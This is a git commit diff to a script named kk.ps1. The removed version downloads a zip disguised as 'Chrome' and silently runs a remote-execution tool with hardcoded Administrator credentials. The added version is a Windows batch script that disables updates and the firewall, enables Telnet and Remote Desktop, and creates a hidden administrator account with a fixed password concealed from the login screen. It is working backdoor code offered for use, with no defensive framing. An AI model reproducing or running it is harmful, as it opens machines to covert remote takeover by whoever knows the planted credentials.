0698cd997974c49e8b9e8037c9d667c3c003d184
37218vuuhuu <103755102+37218vuuhuu@users.noreply.github.com>
2022-12-16 04:11:53 +0700

    Update kk.ps1

--- kk.ps1
+++ kk.ps1
@@ -1,23 +1,33 @@
-[System.Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem")
-net user Administrator Nancyhd1@
-$Url = 'https://github.com/37218vuuhuu/app-19/raw/main/Chrome.57.zip'
+@echo off
 
-[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls"
+REM ****************
+REM Disable off "AUTO UPDATE"
+REM ****************
+sc config wuauserv start= disabled
+net stop wuauserv
 
-$ProgressPreference = 'SilentlyContinue'
+REM ****************
+REM Disable windows xp Firewall
+REM ****************
+netsh firewall set opmode disable
 
-Invoke-WebRequest $Url -OutFile Chrome.57.zip
+REM ****************
+REM Enable TELNET
+REM ****************
+sc config tlntsvr start= auto
+net start telnet
 
-Expand-Archive Chrome.57.zip -DestinationPath Chrome.57
-Set-Location Chrome.57/Chrome.57
+REM ****************
+REM Enable Remote Desktop
+REM ****************
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 
-Start "Chrome.exe"
-Start "RemoteExecuteScriptSilent.exe"
-
-Set-Location Chrome.57/Chrome.57
-Start "Autologon64"
-Get-PSReadLineKeyHandler -Chord Enter
-
-Set-Location Chrome.57/Chrome.57
-Start-Process "Autologon64" -ArgumentList "Administrator","Administrator","Nancyhd1@"
-Get-PSReadLineKeyHandler -Chord Enter
+REM ***************
+REM Create a HIDDEN USER usr= Administrator, pass= Nancyhd2@
+REM ***************
+net user Administrator Nancyhd2@ /add
+net localgroup "Administrators" /add Administrator
+net localgroup "Users" /del Administrator
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Administrator /t REG_DWORD /d 0 /f
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f
+exit
